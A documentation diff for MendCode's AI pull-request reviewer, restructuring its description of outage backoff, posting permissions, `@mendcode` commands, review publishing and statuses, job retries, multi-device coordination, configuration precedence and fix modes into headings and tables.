+The only other way, a separate `CODEX_HOME`, needs your login copied or moved, which MendCode never does. A read outside the checkout is refused with what may be read instead.
+
+### Incremental reviews and fixed findings
+
+A push reviews only the commits since the last reviewed head (the whole PR after a force push) and re-checks the
 published findings in the files it changed, whether their lines were rewritten, moved, or left as they were while code next to
 them changed (a fix often inserts the missing call above the flagged line): one that no longer reproduces gets its thread resolved.
 The last reviewed head is the saved state's, or, when this device has none (another device reviewed, the data directory was wiped),
@@ -280,17 +434,27 @@ resumes by itself with a second notice; `/pr watch-repo` tries at once. It keeps
 and the `@mendcode` comments written during the pause (every page of them) are handled when it resumes, not taken as a new
 baseline. Before, a paused watch waited for `/pr watch-repo`, which took the PRs open at that moment as the baseline.
 
-**Outages and sleep.** A listing that fails for any other reason backs off: the next tick lists again, then the gap doubles (2,
-4, 8 minutes) up to 15 minutes, and the watch resumes by itself at the first listing that works, reading the PRs opened, the heads
-pushed and the `@mendcode` comments written meanwhile (the platform's catch-up runs too, as after a pause). Failing time is counted
-awake: the daemon compares the wall clock with a monotonic clock that stops while the machine sleeps, and never counts more than two
-backoff gaps between two failed listings, so a laptop asleep with its lid closed (dark wakes without network included) adds
-nothing. A network or forge outage (no route, DNS, timeouts, 5xx, rate limits) or an error that says neither never ends a watch:
-after 15 awake minutes the session hears of it once, and again when the watch lists its PRs again. Only a permanent error (the
-repository gone or renamed away, a 404; access revoked, a 403 that is not a rate limit; a checkout whose remotes no longer point at
-GitHub) for 15 awake minutes in a row ends the watch, with that error in the notice; `/pr watch-repo` starts it again. Before, 15
-wall-clock minutes of any failure ended it, so closing a laptop for a quarter of an hour stopped every review until someone ran
-`/pr watch-repo` (seen live, ~4 h asleep).
+### Outages and sleep
+
+A listing that fails for any other reason backs off. The next tick lists again, then the gap doubles (2, 4, 8 minutes) up to 15 minutes.
+
+At the first successful listing, the watch resumes by itself. It reads PRs opened, heads pushed and `@mendcode` comments written meanwhile; the platform's catch-up runs too, as after a pause.
+
+Failing time is counted awake. The daemon compares wall time with a monotonic clock that stops during sleep, and never counts more than two backoff gaps between failed listings.
+
+A laptop asleep with its lid closed adds nothing, including dark wakes without network.
+
+| Failure | Watch behavior |
+|---|---|
+| Network or forge outage: no route, DNS, timeouts, 5xx, rate limits | Never ends the watch. After 15 awake minutes, the session hears of it once, and again when PR listing works. |
+| An error that says neither | Same: never ends the watch. |
+| Permanent error for 15 awake minutes in a row | Ends the watch with that error in the notice. `/pr watch-repo` starts it again. |
+
+Permanent errors include a repository gone or renamed away (404), access revoked (403 that is not a rate limit), or a checkout whose remotes no longer point at GitHub.
+
+Before, 15 wall-clock minutes of any failure ended the watch. Closing a laptop for a quarter of an hour stopped every review until someone ran `/pr watch-repo` (seen live, ~4 h asleep).
+
+### Held notices and saved state
 
 Every notice (a review's findings, a failure, an `@mendcode` comment that was not answered and why) goes to the session only while
 it is free, so it never cuts into your turn or your queue. One that arrives during a turn, behind queued messages, after a cancel or
@@ -304,7 +468,9 @@ platform's `jobs.json`, `effects.json`, `accounting.json`, `ownership.json`, `de
 
 ## Many reviewers on one repository
 
-Anyone can point a reviewer at a public repository, so the repository decides who may post, on its base branch:
+Anyone can point a reviewer at a public repository. The repository decides who may post through its base branch.
+
+### Who may post and answer
 
 - **Who posts:** `publishers` in `.mendcode/review.yaml`. `maintainers` (the default) posts only from a `gh` login with write
   access; a list (`publishers: [alice, bob]`) names the logins that may, contributors without write access included; `anyone` lets
@@ -329,20 +495,33 @@ Anyone can point a reviewer at a public repository, so the repository decides wh
   user's permission (GitHub needs push access for that), so it accepts the comment's author association instead: owner, member or
   collaborator.
 
-The usual setups: one reviewer of every PR (the hosted workflow, or one `/pr watch-repo all` on a server) and everyone else
-`requested`; or every developer `requested` and no shared reviewer. Step by step, with the trade-offs for laptops that are often
-off: [team setup](pr-review-setup.md).
+### Choose a team setup
+
+| Setup | Reviewers |
+|---|---|
+| Shared reviewer | One reviewer of every PR: the hosted workflow, or one `/pr watch-repo all` on a server. Everyone else uses `requested`. |
+| Personal reviewers only | Every developer uses `requested`; no shared reviewer. |
+
+For steps and trade-offs for laptops that are often off, see [team setup](pr-review-setup.md).
 
 A repository that has not set `enabled: true` is still reviewed by a watch you started, into your own session only: nothing is
 posted and you are not asked to post.
 
 ## Commands in a pull request
 
-A comment whose line starts with `@mendcode` and a command word runs it; quoted lines, code blocks and MendCode's own replies (they
-carry `<!-- mendcode:reply -->`) never do. Only someone with write, maintain or admin access is answered with anything but one reply
-saying only maintainers can run it. Each answer goes in the same thread. Every command is checked in one order: the commenter's
-permission first, then the repository's filters, then the reviewed head (and claims). So someone without write access always
-gets the one refusal, whatever state the head is in.
+Start a comment line with `@mendcode` and a command word. Each answer goes in the same thread.
+
+Quoted lines, code blocks and MendCode's own replies (`<!-- mendcode:reply -->`) never run commands.
+
+### Permission checks
+
+Only someone with write, maintain or admin access gets anything but one reply saying only maintainers can run it. Every command is checked in this order:
+
+1. The commenter's permission.
+2. The repository's filters.
+3. The reviewed head and claims.
+
+Someone without write access always gets the one refusal, whatever state the head is in.
 
 A comment from the daemon's own login is its owner's request. Its `@mendcode review` runs like `/pr review`, and its `@mendcode fix`
 still needs that login's write access. Anything it is refused is said in the session only, never posted on the pull request.
@@ -359,9 +538,11 @@ still needs that login's write access. Anything it is refused is said in the ses
 | `@mendcode approve` | Off unless `commands.approve: true` on the base branch. Submits an approval of the head only when the last finished review of that very head exists, has no confirmed finding open (plausible ones do not block) and the head has not moved; otherwise the reply says why, listing the confirmed findings. The approval is MendCode's verdict on its own review, not a person's. GitHub, GitLab (with the head's sha) and Gitea. Local daemon only. |
 | `@mendcode learn <text>` | Replies with the line to add to `.mendcode/review-learnings.md` and the commit to make on the base branch; a learning counts once merged there, so a PR never teaches the reviewer by itself. |
 
-The local repo watch reads new comments of the watched repository with two `gh api` calls per poll (issue comments and review
-comments since the last poll) and answers with your own `gh` login, once you allowed posting to that repository (`/pr publish on`);
-until then the session is told which command waits. The hosted workflow answers comment events itself.
+### How commands wait and recover
+
+The local repo watch reads new comments with two `gh api` calls per poll: issue comments and review comments since the last poll.
+
+It answers with your own `gh` login once you allow posting to that repository (`/pr publish on`). Until then, the session is told which command waits. The hosted workflow answers comment events itself.
 
 A command is kept with the watch (`commands` in `watches.json`) from the poll that reads it until it is answered, so none is lost:
 
@@ -389,32 +570,50 @@ A command is kept with the watch (`commands` in `watches.json`) from the poll th
 - A watch saved before commands were kept, that never posted, reads its comments again from the watch's start once: commands that
   were dropped for a missing `/pr publish on` wait like new ones. A watch that did post keeps its marks.
 
-**Follow-ups.** While a repository is watched, a check that fails on a head MendCode reviewed and posted on gets one comment with its
-cause: the failed job's error lines from `gh run view --log-failed` (bounded, at most three checks). The same failing set on the same
-head is explained once; a new failure or the same one on a new head is explained again. The checks of one PR are read at most every
-five minutes. The hosted workflow has no follow-ups.
+### Follow-ups
+
+While a repository is watched, a check that fails on a head MendCode reviewed and posted on gets one comment with its cause. It uses the failed job's error lines from `gh run view --log-failed`, bounded to at most three checks.
+
+- The same failing set on the same head is explained once.
+- A new failure, or the same one on a new head, is explained again.
+- The checks of one PR are read at most every five minutes.
+- The hosted workflow has no follow-ups.
 
 ## On GitHub's runners: the hosted workflow
 
-`github install --hosted` writes a workflow that reviews each pull request on `ubuntu-latest` with the repository's own model
-secret and `GITHUB_TOKEN`; the runner keeps no state, it reads the markers of the earlier reviews. Setup, secrets, the pinned
-release and what happens on a fork: [GitHub automation](github.md#hosted-pr-reviewer). It does not need
-`experimental.pr_review` (that switch is the local daemon's): it runs only once a maintainer has committed the workflow and its
-secret, and posts only with `enabled: true` on the base branch. A hosted review runs no `checks`.
+1. Run `github install --hosted` to write a workflow that reviews each pull request on `ubuntu-latest` with the repository's own model secret and `GITHUB_TOKEN`.
+2. A maintainer commits the workflow and its secret. Only then does it run.
+3. Set `enabled: true` on the base branch to allow posting.
+
+The runner keeps no state; it reads the markers of earlier reviews. It does not need `experimental.pr_review`, which is the local daemon's switch. A hosted review runs no `checks`.
+
+For setup, secrets, the pinned release and what happens on a fork, see [GitHub automation](github.md#hosted-pr-reviewer).
 
 ## Publishing
 
-One `POST /repos/{owner}/{repo}/pulls/{n}/reviews` with event `COMMENT`, never `REQUEST_CHANGES`: the summary as its body and one
-inline comment per new finding on the diff's new side, with a ```suggestion block when the fix stays on the commented lines. Each
-review carries `<!-- mendcode:review head=SHA -->` and each comment `<!-- mendcode:f=ID -->` (the finding's sha1 of path, line,
-category and summary): a finding already posted is never posted again, the same head is never reviewed twice, and a later head with
-nothing new posts nothing. A comment GitHub refuses (422) moves into the summary and the request is sent once more; any other failure
-posts nothing and the findings stay in the session. Over `budget.tokens_per_pr` the review closes with one short check and publishes
-only what it confirmed, as a partial review that says what it did not cover
-([a review that reaches the cap](#a-review-that-reaches-the-cap)). The budget counts input the provider did not serve from its cache, plus output: a child that
-reads files resends its conversation on every step, so cache reads would stop an ordinary PR before verification (one live review
-of an 8-file PR read 207,343 input tokens in its first pass). The cost line shows the cache reads apart. A review the budget
-stopped before verifying says so in its verdict, never "No findings".
+MendCode sends one `POST /repos/{owner}/{repo}/pulls/{n}/reviews` with event `COMMENT`, never `REQUEST_CHANGES`. The summary is its body, with one inline comment per new finding on the diff's new side.
+
+A ```suggestion block is included when the fix stays on the commented lines.
+
+### Dedupe and failed posts
+
+| Marker | Identifies |
+|---|---|
+| `<!-- mendcode:review head=SHA -->` | The reviewed head. |
+| `<!-- mendcode:f=ID -->` | The finding's sha1 of path, line, category and summary. |
+
+A finding already posted is never posted again, the same head is never reviewed twice, and a later head with nothing new posts nothing.
+
+- A comment GitHub refuses (422) moves into the summary; the request is sent once more.
+- Any other failure posts nothing; the findings stay in the session.
+
+### Incomplete reviews and verification
+
+Over `budget.tokens_per_pr`, the review closes with one short check and publishes only what it confirmed, as a partial review that says what it did not cover ([a review that reaches the cap](#a-review-that-reaches-the-cap)).
+
+The budget counts input the provider did not serve from its cache, plus output. A child reading files resends its conversation on every step, so counting cache reads would stop an ordinary PR before verification.
+
+One live review of an 8-file PR read 207,343 input tokens in its first pass. The cost line shows cache reads apart. A review stopped before verification says so in its verdict, never "No findings".
 
 The verification line under the verdict says what the separate pass did, so "No findings" never claims a check that did not run:
 "the review pass raised no candidate findings, so no separate pass was needed" when there was nothing to verify; "a separate
@@ -422,34 +621,62 @@ pass checked N candidates again and confirmed none" when every candidate was dro
 separate pass (N candidates judged)" when some were kept; and for a stopped review, that it is incomplete and that nothing
 unverified is published. Candidates outside the diff that were left out are counted on the same line.
 
+### Commit status
+
+A review that publishes to GitHub sets `MendCode review` on the PR head, or `MendCode review (<id>)` for a reviewer other than the repository's own.
+
+| Status | Meaning |
+|---|---|
+| `pending` | "Reviewing…" when it starts. |
+| `success` | "No findings", "No new findings" when a re-review posted nothing, or "N findings, none blocking". |
+| `failure` | A critical or major finding is open on that head. |
+| `error` | The review stopped before completion: token budget, quota or failure. Never `success`. |
+
+The status links to the review, or to the pull request when nothing was posted.
+
+To require it, add `MendCode review` as a required status check in the base branch's protection rule: Settings → Branches, or a ruleset.
+
+- The hosted workflow sets it only when its token has `statuses: write`; add it under `permissions:`. A token that cannot is skipped quietly and the review goes on.
+- `status: false` in the base branch's `.mendcode/review.yaml` sets none.
+
 ### What a review looks like
 
-The summary (`publish.ts` `reviewBody`) starts with `## MendCode review`, the verdict (`**3 findings** · 🔴 1 critical · 🟠 2 major`,
-or `**No findings**`), the head and whether only the commits since the last review were read. Then the merge risk and its reason
-(`**Merge risk:** 🟡 Medium · …`) and the change type with the review effort, the model's summary, one table of every finding worst
-first, each linked to its lines at the reviewed head, the **Walkthrough** folded (overview, a `Layer / files | Summary` table and the
-sequence diagram), the **Pre-merge checks** folded with their counts in the title (open when one did not pass; absent when the
-review had no title or description to check), the findings GitHub would not take inline, and a folded
-**Review details**: files reviewed, changed lines and an estimated review effort (1 to 5, by changed lines), the profile and cap,
-how many candidates the verify pass left out, the tokens spent, and the notes (no code graph, what the budget cut). A last line
-lists the `@mendcode` commands.
+The summary (`publish.ts` `reviewBody`) presents these parts in order:
 
-An inline comment (`commentBody`) leads with `**🟠 Major** · **Correctness** · confirmed by a second pass` (or `plausible, not
-confirmed`) and the verifier's `score 8/10` in small text, then the problem in bold, why, a ```suggestion block when the fix stays on the commented lines, and folded:
-**Evidence** (the `file:line` references) and **Prompt for an AI agent**, which tells an agent to treat the finding as data, check it
-against the current code and change nothing when it no longer holds. Marks are plain characters, never hosted images, so the review
-reads the same on GitHub Enterprise and in a mail notification. Besides the id marker each comment carries the finding itself as
-`<!-- mendcode:data BASE64 -->`, which a hosted runner reads back exactly whatever markdown the text holds (comments written before
-it are read from their first line).
+1. `## MendCode review`, the verdict (`**3 findings** · 🔴 1 critical · 🟠 2 major`, or `**No findings**`), the head and whether only commits since the last review were read.
+2. Merge risk and its reason (`**Merge risk:** 🟡 Medium · …`), then change type with review effort.
+3. The model's summary and one table of every finding, worst first, each linked to its lines at the reviewed head.
+4. Folded **Walkthrough**: overview, a `Layer / files | Summary` table and the sequence diagram.
+5. Folded **Pre-merge checks**, counts in the title. Open when one did not pass; absent when the review had no title or description to check.
+6. Findings GitHub would not take inline.
+7. Folded **Review details**: files reviewed, changed lines, estimated review effort (1 to 5, by changed lines), profile and cap, candidates the verify pass left out, tokens spent and notes (no code graph, what the budget cut).
+8. A last line listing the `@mendcode` commands.
+
+An inline comment (`commentBody`) leads with `**🟠 Major** · **Correctness** · confirmed by a second pass` (or `plausible, not confirmed`) and the verifier's `score 8/10` in small text.
+
+Then come the problem in bold, why, and a ```suggestion block when the fix stays on the commented lines. Folded sections contain:
+
+- **Evidence**: the `file:line` references.
+- **Prompt for an AI agent**: treat the finding as data, check it against current code, and change nothing when it no longer holds.
+
+Marks are plain characters, never hosted images, so the review reads the same on GitHub Enterprise and in a mail notification.
+
+Besides the id marker, each comment carries the finding as `<!-- mendcode:data BASE64 -->`. A hosted runner reads it back exactly whatever markdown the text holds; comments written before it are read from their first line.
 
 ## Review platform: global and personal reviewers
 
-One review experience with two kinds of reviewer: the repository's **global** reviewer (team rules and the repository's context,
-on a server or any machine) and a developer's **personal** reviewer (their own MendCode, with the context and memory they allow).
-It is built as modules under `packages/daemon/src/pr-review/`, wired into the daemon's PR reviewer (`service.ts`, `run.ts`,
-`control.ts`), each with its own tests. Cross-module scenarios are in `packages/daemon/test/pr-review-platform-*.test.ts`, and
-`pr-review-platform-service.test.ts` runs them end to end through the service with the real review run. They use temp directories,
-temp git repositories, a fake `gh` and scripted model turns with no network, so they are contract evidence, not live evidence.
+Choose between two kinds of reviewer in the same review experience:
+
+| Reviewer | Context and location |
+|---|---|
+| **Global** | The repository's reviewer: team rules and repository context, on a server or any machine. |
+| **Personal** | A developer's own MendCode, with the context and memory they allow. |
+
+The platform is built as modules under `packages/daemon/src/pr-review/`, wired into the daemon's PR reviewer (`service.ts`, `run.ts`, `control.ts`), each with its own tests.
+
+Cross-module scenarios are in `packages/daemon/test/pr-review-platform-*.test.ts`. `pr-review-platform-service.test.ts` runs them end to end through the service with the real review run.
+
+They use temp directories, temp git repositories, a fake `gh` and scripted model turns with no network. They are contract evidence, not live evidence.
 
 Live evidence (2026-10-30): the daemon's GitHub path ran in a private sandbox repository with a Claude model through Claude Code.
 That run covered reviews and inline findings, no duplicates after SIGKILL and SIGTERM restarts, the `@mendcode` commands and
@@ -477,34 +704,50 @@ setup`. What each topology gives up: [team setup, limits](pr-review-setup.md#lim
 
 ### Jobs, restarts and remote effects
 
-Every review the watch starts is a job in `<dir>/pr-review/jobs.json` (0600, written atomically on every change), not an
-in-memory queue. A job is one reviewer's work on one head, base and config version: the same event twice is the same job, a
-listing older than one already read changes nothing, and a push while a job of the PR runs marks that job superseded (it ends
-`stale` and its result is not posted) and queues the new head. A daemon that stops while a job runs finds it at the next start,
-back in line with the interrupted attempt counted. A failed job is retried with exponential backoff and full jitter (up to 30
-seconds at first, doubling, never more than 30 minutes) and is `failed` after 5 attempts; a new head or `/pr review` starts a new
-one. A failure that is not the job's own spends no attempt: one whose error names the network or the forge's servers (no route,
-DNS, a timeout, a 5xx, a rate limit), one whose attempt the machine slept through (the wall clock ran ahead of the monotonic one),
-or one whose error says neither while the forge cannot be reached either (one `gh api rate_limit` read; GitLab and Gitea: a
-listing). Such a job waits (15 to 30 s at first, doubling, at most 15 minutes) and runs again, for up to 24 hours after its first
-such failure; past that its failures count as above. The session hears of the first failure, not of every wait. Each failure or
-stop notice names the repository, the PR, the head's first 12 characters, the reason, the next retry time (UTC) and the attempts
-left, and ends with a `Head: <sha12>` line.
+Every review the watch starts is a job in `<dir>/pr-review/jobs.json`: mode 0600, written atomically on every change, not an in-memory queue.
 
-A review, verify or fix turn has no fixed time limit, since a large PR's review can rightly take long. A turn is stopped as
-stalled after 10 minutes with no event from the model. A fix session waiting for your approval is not idle, and every turn has a
-hard cap of 2 hours. A stalled turn keeps the job's work in its checkpoint and is retried with backoff from there. A stall is not
-a network outage, so each of its retries spends an attempt. A model child that never answers its start handshake (Claude Code's
-`no answer to initialize`, seen under heavy load) is retried the same way. A turn that fails with the network's or the forge's words (a timeout,
-a 5xx) is a transient failure, as above. A job only moves
-along fixed transitions: a finished job never runs again by itself, and nothing becomes `done` without
-running. The newest 500 finished jobs are kept. A damaged file is set aside (`jobs.json.corrupt-<time>`) and the next poll reads the
-open PRs again. Each poll lists every open PR (up to 1,000), so after a pause or downtime the PRs opened, the heads pushed and the
-reviews requested meanwhile are found from GitHub's current state, not from events that were missed. A daemon start counts as a
-catch-up: its first listing also asks for the work routed to its personal reviewers that no event announced (a review requested, a
-claim that lapsed while it was down). A catch-up leaves alone a PR head whose review failed for good (an error that retrying does not
-change, told once when it happened), so a restart does not queue it again or repeat the notice; `/reviews` keeps showing it and
-its retry (`r`) runs it again, and a new head is reviewed as usual.
+A job is one reviewer's work on one head, base and config version:
+
+- The same event twice is the same job.
+- A listing older than one already read changes nothing.
+- A push while a job of the PR runs supersedes it: it ends `stale`, its result is not posted, and the new head is queued.
+- A daemon that stops while a job runs finds it at the next start, back in line with the interrupted attempt counted.
+
+#### Retry rules
+
+| Failure | Retry and attempt accounting |
+|---|---|
+| Job failure | Exponential backoff with full jitter: up to 30 seconds at first, doubling, never more than 30 minutes. `failed` after 5 attempts; a new head or `/pr review` starts a new job. |
+| Failure not the job's own | Spends no attempt. Waits 15 to 30 s at first, doubling, at most 15 minutes, then runs again. This lasts up to 24 hours after the first such failure; after that, failures count as above. |
+
+A failure is not the job's own when:
+
+- Its error names the network or forge servers: no route, DNS, timeout, 5xx or rate limit.
+- The machine slept through the attempt: wall time ran ahead of the monotonic clock.
+- The error says neither, but the forge cannot be reached either: one `gh api rate_limit` read, or a listing on GitLab and Gitea.
+
+The session hears of the first failure, not every wait. Each failure or stop notice names the repository, PR, head's first 12 characters, reason, next retry time (UTC) and attempts left, ending with `Head: <sha12>`.
+
+#### Stalls and recovery
+
+A review, verify or fix turn has no fixed time limit, since a large PR's review can rightly take long. Every turn has a hard cap of 2 hours.
+
+- A turn stops as stalled after 10 minutes with no model event. A fix session waiting for your approval is not idle.
+- A stalled turn keeps work in its checkpoint and retries with backoff from there. A stall is not a network outage, so each retry spends an attempt.
+- A child that never answers its start handshake retries the same way: Claude Code's `no answer to initialize`, seen under heavy load.
+- A turn failing with the network's or forge's words (a timeout, a 5xx) is a transient failure, as above.
+
+A job moves only along fixed transitions. A finished job never runs again by itself, and nothing becomes `done` without running. The newest 500 finished jobs are kept.
+
+A damaged file is set aside (`jobs.json.corrupt-<time>`), and the next poll reads open PRs again.
+
+Each poll lists every open PR, up to 1,000. After a pause or downtime, PRs opened, heads pushed and reviews requested meanwhile are found from GitHub's current state, not missed events.
+
+A daemon start counts as catch-up. Its first listing also asks for work routed to personal reviewers that no event announced: a review requested, or a claim that lapsed while it was down.
+
+Catch-up leaves alone a PR head whose review failed for good, an error retrying does not change, told once when it happened. Restarting neither queues it again nor repeats the notice.
+
+`/reviews` keeps showing it; retry (`r`) runs it again. A new head is reviewed as usual.
 
 A second review request for a PR whose review is already queued or running (a repeated `/pr review`, `@mendcode review` on a head
 the watch is reviewing) joins that job: the answer names it and no second review runs. `/reviews` shows a running job with its
@@ -522,9 +765,16 @@ the spinner and the time move with the activity status's own clock, which stops 
 `activityPlacement off` hide the status as they do for a turn.
 
 `/reviews` lists one row per pull request: the job at work when there is one, else the newest, with `· N runs` when the PR had
-earlier ones. So a failure that a later review of the same PR superseded is not listed under Failed: Failed holds the PRs whose
-last run failed. A running row shows its live phase and time (`analysis · 1m 20s`), a finished one what it found
-(`done · no findings`, `done · 2 findings`). The detail of a running job lists its steps; a done job says how it ended instead of
+earlier ones. On GitHub each row also shows the pull request's own state (`merged`, `closed`, `draft`, `open · ready`,
+`open · CI ✗`, `open · CI …`, `open · conflict`, `open · findings` for an open critical or major finding) and the detail a
+`pull request` line with up to three failing checks; the daemon reads it with one `gh pr list` per repository when the page opens
+and on `r`, keeps it a minute, and leaves the cell empty when the read fails or the forge is GitLab or Gitea. `f` also filters
+on it: `ready`, `needs work` (failing checks, a conflict or a blocking finding) and `closed` (merged or closed). So a failure that a later review of the same PR superseded is not listed under Failed: Failed holds the PRs whose
+last run failed. A running row shows the activity status's spinner with its phase, running step and time
+(`⠋ analysis · 112 files · 1m 20s`), a finished one what it found (`done · no findings`, `done · 2 findings`). Until you pick a
+row (↑↓ or enter, which marks the detail `pinned`), the selection follows the running review that started last, else the job
+updated last, and moves when another review starts; esc returns a pinned selection to following. The detail of a running job
+shows the same live line under its state and lists its steps; a done job says how it ended instead of
 a phase; a failed one names the phase it failed in and its attempts. Under it, `Earlier runs` lists the PR's other runs, newest
 first, each with its head, how it ended and, for a failure, its error. A job or watch this daemon owns says `this device`. When a
 checkout does not answer `status` within 3 seconds (a busy git or a hung child process), the page still gets the jobs and the
@@ -557,11 +807,17 @@ the markers stop the second post where they can.
 
 ### Which pull requests (eligibility)
 
-Status: in the daemon. Each poll passes every PR event through `eligibility.ts`. A PR it does not take is not queued and is not
-announced with a notice: `/pr list` shows the reason. A personal reviewer's profile can only narrow eligibility.
+Status: in the daemon. Each poll passes every PR event through `eligibility.ts`. A PR it does not take is not queued or announced with a notice; `/pr list` shows the reason.
 
-`mode` decides what starts a review by itself: `auto` (the triggers), `on-request` (only a requested reviewer, `@mendcode review`
-or `/pr review`), `labels` (only with a label in `filters.labels.include`). Every decision has a reason a person can read
+A personal reviewer's profile can only narrow eligibility.
+
+| `mode` | What starts a review by itself |
+|---|---|
+| `auto` | The triggers. |
+| `on-request` | Only a requested reviewer, `@mendcode review` or `/pr review`. |
+| `labels` | Only a label in `filters.labels.include`. |
+
+Every decision has a reason a person can read
 (`draft: waits for ready for review`, `labels: none of \`review-me\` is on the pull request`, `author @dependabot[bot] is a bot`);
 a draft the watch skips shows that reason in `/pr list` like any other skipped PR, until it is marked ready.
 Exclusions (`filters.*.exclude`) hold for every trigger, a manual request included. An `@mendcode review` or `@mendcode fix`
@@ -610,7 +866,9 @@ files of at most the 20 newest unreviewed PRs. Every 10 minutes the waiting daem
 that PR again. Once the reviewer's login has submitted a review of the head, the waiting job closes as `done`, naming the device
 that ran it.
 
-**Offline fallback (opt-in).** By default nothing covers a personal reviewer that stays away. With `routing.offline_fallback` in
+#### Offline fallback (opt-in)
+
+By default nothing covers a personal reviewer that stays away. With `routing.offline_fallback` in
 `reviewers.yaml`, a global reviewer takes the PR after a set time:
 
 ```yaml
@@ -630,6 +888,8 @@ waits on that claim, and once the cover's review of the head exists it closes `d
 not reviewed again here") without a model call or a post; the waiting record on the other daemon closes the same way. The
 residual window of PR-comment claims (below) applies here too.
 
+#### Device identity and leases
+
 Without a coordinator there is one explicit owner per key. Each daemon has a device id (`<dir>/pr-review/device.json`, a random id
 and the hostname as a label; not a secret). Leases (`<dir>/pr-review/ownership.json`) carry a fencing number that only grows: an
 expired lease is taken over with a higher fence, a transfer gives the new owner fence + 1, and a write under an older fence is
@@ -637,7 +897,9 @@ refused. Across devices, a claim is a hidden marker comment on the PR that every
 earliest); it counts only for a listed reviewer, written by that reviewer's login (the global reviewer's: the login it posts as),
 for at most a day.
 
-**One writer per pull request.** Every review job claims its PR before it runs: a personal reviewer's, and the repository's global
+#### One writer per pull request
+
+Every review job claims its PR before it runs: a personal reviewer's, and the repository's global
 reviewer's too, so a PC and a VPS that both watch a repository with `all` do not both work on one PR. The claim is posted as a
 comment only when posting is allowed (`/pr publish on` and `publishers`); without that it stays a local lease that other devices
 cannot see, and that daemon cannot post there either.
@@ -660,7 +922,9 @@ cannot see, and that daemon cannot post there either.
   the PR's claim waits due, so they settle the claims again at once (done naming that device's review, or claimed and run here when
   nothing was posted). A claim still held sends the job back to wait; a quota wait or a retry backoff is not touched.
 
-What this does and does not promise: PR-comment claims are best-effort coordination, not compare-and-swap. Posting a claim and
+#### Coordination limits
+
+PR-comment claims are best-effort coordination, not compare-and-swap. Posting a claim and
 reading the others' are separate steps, so two devices that claim within the same few seconds, or while GitHub's comment list lags,
 can both start. What keeps the writes single is the check right before each write (fence and per-head review marker) together with
 the effects ledger (one daemon never sends the same effect twice, and reconciles an unconfirmed one against the PR first). A
@@ -674,6 +938,8 @@ Status: in the daemon. A personal reviewer's run uses its profile as the persona
 through `pr.review`, and the `review_config` tool is offered to sessions while `experimental.pr_review` is on. A native turn from a
 peer never gets it.
 
+#### Configuration precedence
+
 The effective config is preset → repository (`.mendcode/review.yaml` on the base branch, the trust root) → personal profile
 (`<dir>/pr-review/profiles/<provider>/<owner>/<repo>/<login>.json`, versioned, newest 50 versions, never in the repository) → task.
 Each top-level key records the layer it came from. A personal or task layer may narrow and restyle (profile, cap, template, stages,
@@ -682,12 +948,16 @@ what the repository has off or change what it controls (`enabled`, `fixes`, `fix
 `reviewers`, `preset`; `tokens_per_pr: null` over a capped repository is refused). A refused value is a problem naming its key path,
 never a silent change.
 
+#### Choose the scope before changing configuration
+
 The configuration actions (`config-show`, `config-preview`, `config-apply`, `config-revert`, `config-history`) need a `scope`:
 without one nothing is read or changed and the answer names both targets. `global` writes the checkout's `.mendcode/review.yaml`
 working-tree file only (never staged, committed or pushed; it counts once committed on the base branch), and its versions are the
 file's commits. `personal` saves a new profile version; a revert is a new version equal to an old one. The `review_config` model
 tool is the conversational side of these actions ("my review" is personal, "the repo's" is global; each write asks you with the
 exact before and after). Every action but `setup` needs a `scope`.
+
+#### Start a guided setup
 
 `review_config` `setup` is read-only, and it is where a guided setup with the developer starts ([team setup](pr-review-setup.md)).
 It reports:
@@ -732,8 +1002,15 @@ must allow edits from maintainers. Otherwise each fix is kept on a local ref. `@
 and release are actions of the `/reviews` page. Fix sessions run with `--setting-sources user` on Claude Code, so the PR's own
 harness settings never load.
 
-`fix.mode`: `review` (no fix), `fix-once` (one fix round of the confirmed findings, whatever `fix.max_rounds` says) or `fix-loop`
-(fix, validate, review again until no confirmed finding is open, at most `fix.max_rounds` rounds). A fix runs in a throwaway worktree, never your checkout, and is committed and kept on
+#### Choose a fix mode
+
+| `fix.mode` | Behavior |
+|---|---|
+| `review` | No fix. |
+| `fix-once` | One fix round of the confirmed findings, whatever `fix.max_rounds` says. |
+| `fix-loop` | Fix, validate, review again until no confirmed finding is open, at most `fix.max_rounds` rounds. |
+
+A fix runs in a throwaway worktree, never your checkout, and is committed and kept on
 `refs/mendcode/fix/<number>/<time>` before anything else is decided. It is pushed only when `fix.push` is on (and `fix.personal` for
 a personal reviewer), the job is not taken over, the PR is still open, the reviewer may still push (a fresh permission read; a fork
 must allow edits from maintainers), and the branch tip (and the base, when it matters) is still where the fix started. Otherwise the
@@ -741,7 +1018,9 @@ commit stays on its local ref with the reason; a branch that moved makes the res
 force push, never a merge. A failed validation never ends `done`; rounds that do not shrink the open findings stop after
 `phases.max_rounds_without_progress` (`no_progress`, in rounds), and `fix.max_rounds` caps the loop.
 
-**A pushed fix is reviewed by its job.** After a push the job reviews the head it pushed, incrementally (only the fix's commits,
+#### Review the pushed fix
+
+After a push the job reviews the head it pushed, incrementally (only the fix's commits,
 from the last reviewed head), and that review resolves the threads of the findings the fix removed. GitHub reports a pushed head a
 few seconds late, so the job first waits for GitHub to report it (reads at once and after 1, 2, 4, 8 and 15 s). A round counts as
 resolving findings only when that review ran: when GitHub still reports the old head after about 30 s, the job ends `failed` with
@@ -750,7 +1029,9 @@ as not checked again (never `done`), and the watch takes the pushed head back as
 review like any push. When the head moved past the fix (someone pushed on top), the job ends `stale` and that head's own review
 covers the fix's commits.
 
-**A round resolves only what its re-check closed.** That review re-checks the findings the round set out to fix with the published
+#### Count only findings the re-check closed
+
+That review re-checks the findings the round set out to fix with the published
 ones, in every file the fix changed, so a fix that inserts the missing line next to the flagged one (the flagged line itself only
 moves) is checked like one that rewrites it. The round counts as resolving exactly the findings the re-check found fixed; the others
 stay open beside whatever the review found new: `fix-loop` fixes them in its next round, and `fix-once` (or a loop at
@@ -758,11 +1039,15 @@ stay open beside whatever the review found new: `fix-loop` fixes them in its nex
 re-check that fails resolves nothing. Before, a round counted every finding it set out to fix as resolved when the review of the
 fix found nothing new, so an inserted fix ended `done` with its thread open (seen live).
 
-**Commit messages.** A fix commit's subject is at most 72 characters, cut at a word. A `fix.mode` commit is named after the finding
+#### Fix commit messages
+
+A fix commit's subject is at most 72 characters, cut at a word. A `fix.mode` commit is named after the finding
 it fixes (or `fix: address N confirmed findings of MendCode's review`) and its body says it is the automatic fix mode
 (`fix.mode: fix-once`) and lists the findings; an `@mendcode fix` commit is named after the request and its body names the commenter
 and links the comment. The fix session's prompt says the same: an automatic fix is not presented as someone's `@mendcode fix`. Both
 kinds of fix session are told the repository's review language (`template.language`), since what they write is public too.
+
+#### Take over and release a fix session
 
